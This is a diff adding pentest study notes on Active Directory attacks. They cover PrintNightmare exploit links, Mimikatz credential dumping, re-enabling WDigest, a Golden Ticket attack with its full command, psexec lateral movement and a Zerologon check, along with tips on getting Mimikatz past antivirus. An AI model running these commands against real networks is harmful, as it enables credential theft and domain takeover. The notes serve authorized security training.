@@ -296,6 +296,76 @@ Now, run responder on the attack machine and wait for the hashes to be dumped to
 
 syntax: responder -I eth0 -v
 
+PrintNightmare CVE-2021-1675
 
+This is a really new vulnerability and we should be testing for it. 
+
+To run it, we are going to need to do a bunch of things, so worth checking out this video:
+
+https://academy.tcm-sec.com/courses/1152300/lectures/33637715
+
+and also:
+
+https://github.com/cube0x0/CVE-2021-1675 and https://github.com/calebstewart/CVE-2021-1675
+
+Mimikatz 
+
+https://github.com/gentilkiwi/mimikatz
+
+We need to install this on the DC and note that this assumes that we have some type of user access to the DC. Antivirus does not like Mimikatz and will block you from downloading it, so you can download it to your attack machine and then put it on a share which is connected to the DC (if possible) or download in some other way.
+
+Once it is downloaded, unzip and then open a cmd. Cd to the x64 folder in Mimikats. 
+
+Run:
+
+syntax: mimikatz.exe
+syntax: privilege::debug
+We are looking for a response like: 
+<Privilege 20 ok>
+
+syntax: sekurlsa::logonpasswords
+
+What can we do with this info? Well, we can get any hashes of users that have logged into the computer. These hashes are NTLM, not NTLMv2, so that means we can use Mimikatz to pass the hash around. 
+
+You might also see Password (Null) in the output. There was a bug where passwords were being put in clear text with something called WDigest. Microsoft fixed this, but all they did was turn the service off. It is possible to turn it back on and then wait until someone logs out and back in and then you will have the password in clear text.
+
+https://www.csoonline.com/article/3438824/how-to-detect-and-halt-credential-theft-via-windows-wdigest.html
+
+syntax: lsadump::lsa /patch
+
+The above allows us to dump the Local Security Authority. This is a protected subsystem in Windows Authentication. It authenticates and provides login to the local computer.
+
+We can take all theses hashes offline and try to crack them. If we can crack a % of them, we can give the client a good idea of how strong their password policy is. Remember, if we can crack 50% of hundreds of users, then their password policy is weak.
+
+Golden Ticket Attacks
+
+We need the LSA hash from Kerberos done above to complete a Golden Ticket Attack.
+
+syntax (in mimikatz): lsadump::lsa /inject /name:krbtgt (krbtgt is the Kerberos username)
+
+After running this, open up a Notepad and copy the S-value to the Notepad. 
+We also need the NTLM hash of the Kerberos ticket grating ticket account, so paste that into the Notepad as well. 
+
+Now, we are going to pass the ticket.
+
+syntax: kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<SIDfromNotepad> /krbtgt:<HASHfromNotepad> /id:500 /ptt (It can be any user, even a fake one, but the domain has to be the correct domain and ptt just means pass the ticket).
+
+If this is successful, we can run:
+syntax: misc::cmd
+We can now connect to any computer on the network. 
+syntax: dir \\COMPUTERNAME\c$
+This should list the contents of the C Drive on another computer. 
+We could download psexec, which was developed for Windows, to access the other computers on the network. 
+
+syntax: psexec -i \\COMPUTERNAME cmd
+This will open an iteractive shell on the computer.
+
+ZeroLogin
+
+This vulnerability allows the attacker to change the password of the Admin account on the DC to Null, which allows you to login without a password. However, this breaks things on the system. So, it is much better to run the check to see if the system is vulnerable. 
+
+https://github.com/dirkjanm/CVE-2020-1472
+
+syntax: ./zerologon_tester.py DC-Name DC-IP (download the file for this from here: https://github.com/SecuraBV/CVE-2020-1472)
 
 
